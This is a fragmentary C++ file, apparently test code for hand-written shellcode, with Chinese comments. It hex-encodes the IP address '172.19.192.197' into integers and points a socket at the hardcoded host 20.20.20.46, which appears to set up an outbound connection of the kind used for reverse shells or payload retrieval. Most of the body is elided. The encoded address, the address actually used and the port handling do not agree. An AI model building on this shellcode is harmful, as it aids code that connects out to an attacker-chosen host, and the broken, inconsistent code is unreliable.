// shellcode_test.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
...
__declspec(noinline) void customshellcode() {
    ...
    short port = static_cast<uint64_t>(text.t0);
    ...
    // 39 32 2E 31 39 37
    /**172.19.192.197 转换成ASCII码的十六进制表示：
    "1" = 31
    "7" = 37
    "2" = 32
    "." = 2E
    "1" = 31
    "9" = 39 */
    text.t0 = 0x312E39312E323731;  // "172.19.1"
    text.t1 = 0x00003739312E3239;  // "92.197" + 结尾的null字节
    

    sock_addr.sin_addr.s_addr = inet_addr("20.20.20.46");/**(const char*)&text.t0` 会将这些十六进制值解释为字符串 */
